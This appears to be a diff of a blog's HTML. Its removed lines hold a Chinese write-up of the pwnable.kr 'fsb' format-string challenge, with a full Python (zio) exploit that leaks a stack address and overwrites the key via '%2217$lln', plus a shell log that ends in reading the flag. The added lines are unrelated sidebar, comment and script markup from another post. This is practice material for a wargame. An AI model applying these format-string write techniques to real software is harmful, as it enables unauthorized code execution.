-<p>今天又重新试了一下，发现之前看的那种方法也不太合适，因为要打印太多字符，后来又想了下，可以在栈上找<strong>key</strong>的地址，然后覆盖key即可绕过，因为服务器开了<strong>aslr</strong>，所以可以用暴力的方法去找key的地址</p>
-<p>不断用<code>%2217$x</code>即可，直到打印出<code>0x8048060</code></p>
-<p>到了写入的阶段，没有想到如何一次写两个字，在网上找了一些资料后发了了可以用<code>%lln</code></p>
-<p>因此在碰撞出来之后，再用<code>%2217$lln</code>写入即可覆盖<strong>key</strong></p>
-<h2 id="Exploit">Exploit</h2><p>这个exp只能在本地运行，服务器上没有zio。pwntools的版本也是写过一个，但是因为程序没有用setbuf来取消标准IO的缓冲，所以读写一直搞不定，干脆就直接ssh到服务器上手输payload了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./fsb'</span></span><br><span class="line"></span><br><span class="line">adr_buf     = <span class="number">0x804a100</span></span><br><span class="line">adr_buf2    = <span class="number">0x804a080</span></span><br><span class="line">adr_key     = <span class="number">0x804a060</span></span><br><span class="line">adr_execve  = <span class="number">0x80486ab</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    io = zio(<span class="string">'./fsb'</span>, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line">    io.read_until(<span class="string">'(1)'</span>)</span><br><span class="line">    io.writeline(<span class="string">'%2217$x'</span>)</span><br><span class="line">    leak = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        io.read_line()</span><br><span class="line">        leak = int(io.read_until(<span class="string">'\n'</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">print</span> hex(leak)</span><br><span class="line">    <span class="keyword">if</span> leak != <span class="number">0x804a060</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n[+] find address of key'</span></span><br><span class="line">        io.read_until(<span class="string">'(2)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'%2217$lln'</span>)</span><br><span class="line">        io.read_until(<span class="string">'(3)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'(4)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'key :'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] your shell !'</span></span><br><span class="line">        io.interact()</span><br><span class="line">        io.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] please wait'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp(target)</span><br></pre></td></tr></table></figure>
-<p>log</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh fsb@pwnable.kr -p2222&#10;&#10;fsb@ubuntu:~$ ls&#10;flag  fsb  fsb.c&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;0&#10;Give me some format strings(2)&#10;^C&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;Segmentation fault&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;0&#10;Give me some format strings(2)&#10;^C&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;804a060&#10;Give me some format strings(2)&#10;%2217$lln&#10;&#10;Give me some format strings(3)&#10;32&#10;32&#10;17$lln&#10;Give me some format strings(4)&#10;2&#10;2&#10;&#10;17$lln&#10;Wait a sec...&#10;key :&#10;0&#10;Congratz!&#10;$ ls&#10;flag  fsb  fsb.c&#10;$ cat flag&#10;Have you ever saw an example of utilizing [n] format character?? :(&#10;$ exit</span><br></pre></td></tr></table></figure>
-<h2 id="Referance">Referance</h2><p><a href="https://gist.github.com/ihciah/2b164e86fa9dd2f267d7" target="_blank" rel="external">https://gist.github.com/ihciah/2b164e86fa9dd2f267d7</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-  </section>
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
+  </div>
 
 
           </div>
@@ -986,6 +498,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -1005,8 +528,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/author.jpg"
@@ -1067,6 +599,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn200"><span class="nav-number">1.</span> <span class="nav-text">pwn200</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.2.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance"><span class="nav-number">1.3.</span> <span class="nav-text">Referance</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn300"><span class="nav-number">2.</span> <span class="nav-text">pwn300</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion-1"><span class="nav-number">2.1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn400"><span class="nav-number">3.</span> <span class="nav-text">pwn400</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion-2"><span class="nav-number">3.1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-2"><span class="nav-number">3.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn500"><span class="nav-number">4.</span> <span class="nav-text">pwn500</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion-3"><span class="nav-number">4.1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-3"><span class="nav-number">4.2.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance-1"><span class="nav-number">4.3.</span> <span class="nav-text">Referance</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -1170,6 +713,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
@@ -1186,9 +733,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = 'index.html';
-      var disqus_title = "";
-      var disqus_url = '';
+      var disqus_identifier = '2016/08/18/xdctf-qual-2015-pwn/';
+      var disqus_title = "xdctf-qual-2015-pwn";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/18/xdctf-qual-2015-pwn/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
@@ -1199,6 +746,8 @@
       }
 
       run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
       
     </script>
   
